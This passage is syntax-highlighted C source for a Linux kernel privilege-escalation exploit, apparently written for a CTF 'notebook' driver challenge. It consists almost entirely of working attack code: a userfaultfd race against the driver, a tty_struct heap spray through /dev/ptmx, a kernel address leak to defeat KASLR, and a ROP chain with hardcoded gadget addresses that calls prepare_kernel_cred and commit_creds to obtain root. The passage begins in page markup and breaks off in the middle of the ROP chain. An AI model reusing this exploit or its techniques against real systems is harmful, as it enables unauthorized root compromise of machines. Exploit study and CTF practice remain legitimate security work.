class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a00929</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET 0xffffffff81238d50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RSP_RBP_POP_RBP_RET 0xffffffff8107875c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81007115</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff81358842</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff81000091</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff810637d4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ 0xffffffff810338bb</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_POP_R12_POP_RBP_RET 0xffffffff810880c1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSI_POP_RDI_POP_RBX_RET 0xffffffff81079c38</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBP_RET 0xffffffff81000367</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBX_POP_RBP_RET 0xffffffff81002141</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RAX_POP_RBX_POP_RBP_RET 0xffffffff810cadf7</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><span class="hljs-type">static</span> <span class="hljs-type">sem_t</span> sem_add, sem_edit;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> * buf; <span class="hljs-comment">// for userfaultfd</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-number">100</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <br>&#123;<br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125; Note;<br><br><span class="hljs-type">long</span> note_fd;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteAddWrapper</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    <span class="hljs-built_in">noteAdd</span>(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteEditWrapper</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    <span class="hljs-built_in">noteEdit</span>(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteGift</span><span class="hljs-params">(<span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">evilAdd</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">sem_wait</span>(&amp;sem_add);<br>    <span class="hljs-built_in">noteAdd</span>((<span class="hljs-type">int</span>)args, <span class="hljs-number">0x50</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">evilEdit</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">sem_wait</span>(&amp;sem_edit);<br>    <span class="hljs-built_in">noteEdit</span>((<span class="hljs-type">int</span>)args, <span class="hljs-number">0x2000</span>, buf);<br>&#125;<br><br><span class="hljs-keyword">struct</span><br>&#123;<br>    <span class="hljs-type">void</span> * buf;<br>    <span class="hljs-type">size_t</span> size;<br>&#125; notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> tty_fd[<span class="hljs-number">0x100</span>], tty_idx, fake_tty_ops_idx = <span class="hljs-number">-1</span>, fake_stack_idx = <span class="hljs-number">-1</span>, hit_tty = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">pthread_t</span> <span class="hljs-type">tmp_t</span>, <span class="hljs-type">add_t</span>, <span class="hljs-type">edit_t</span>;<br>    Note note;<br>    <span class="hljs-built_in">saveStatus</span>();<br>    <span class="hljs-built_in">sem_init</span>(&amp;sem_add, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">sem_init</span>(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    note_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    page_size = <span class="hljs-built_in">sysconf</span>(_SC_PAGE_SIZE);<br><br>    <span class="hljs-built_in">registerUserFaultFd</span>(buf, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">noteAdd</span>(i, <span class="hljs-number">0x20</span>, page);<br>        <span class="hljs-built_in">noteEdit</span>(i, TTY_STRUCT_SIZE, page);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Notebook initialization done.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">pthread_create</span>(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-type">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">sem_post</span>(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Edit threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        tty_fd[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">pthread_create</span>(&amp;<span class="hljs-type">add_t</span>, <span class="hljs-literal">NULL</span>, evilAdd, (<span class="hljs-type">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">sem_post</span>(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Add threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">noteGift</span>((<span class="hljs-type">char</span>*) notebook);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">read</span>(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span class="hljs-type">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    tty_ops = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)kernel_base + kernel_offset);<br><br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m%p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] prepare_kernel_cred: \033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] commit_creds: \033[0m%p\n&quot;</span>, commit_creds);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] swapgs_restore_regs_and_return_to_usermode: \033[0m%p\n&quot;</span>, SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">read</span>(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-type">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake stack at idx \033[0m%d.\n&quot;</span>, fake_stack_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span> || fake_stack_idx == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unable to find enough available notes, you\&#x27;re so lucky that you got so many tty_structs.&quot;</span>);<br>    <br>    <span class="hljs-built_in">noteEdit</span>(fake_tty_ops_idx, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations), fake_tty_data);<br>    <span class="hljs-built_in">noteEdit</span>(fake_stack_idx, <span class="hljs-number">0x100</span>, rop);<br>    <span class="hljs-built_in">noteGift</span>((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake stack: \033[0m%p.\n&quot;</span>, notebook[fake_stack_idx].buf);<br><br>    <span class="hljs-built_in">read</span>(note_fd, tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">0x200</span>);<br><br>    ((<span class="hljs-keyword">struct</span> tty_operations *)fake_tty_ops_data)-&gt;write = PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset;<br><br>    fake_tty_data[<span class="hljs-number">1</span>] = POP_RBX_POP_RBP_RET + kernel_offset;<br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br><br>    fake_tty_ops_data[<span class="hljs-number">1</span>] = POP_RBP_RET + kernel_offset;<br>    fake_tty_ops_data[<span class="hljs-number">2</span>] = notebook[fake_stack_idx].buf;<br>    fake_tty_ops_data[<span class="hljs-number">3</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br><br>    <span class="hljs-type">int</span> rop_idx = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = <span class="hljs-number">0xdeadbeefdeadbeef</span>; <span class="hljs-comment">//for pop rbp, not useful;</span><br>    rop[rop_idx++] = POP_RDI_RET + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = prepare_kernel_cred;<br>    <span class="hljs-comment">// rop[rop_idx++] = POP_RDX_RET + kernel_offset;</span><br>    <span class="hljs-comment">// rop[rop_idx++] = RET;</span><br>    rop[rop_idx++] = MOV_RDI_RAX_POP_RBP_RET + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0xdeadbeefdeadbeef</span>; <br>    rop[rop_idx++] = commit_creds;<br>    rop[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span> + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    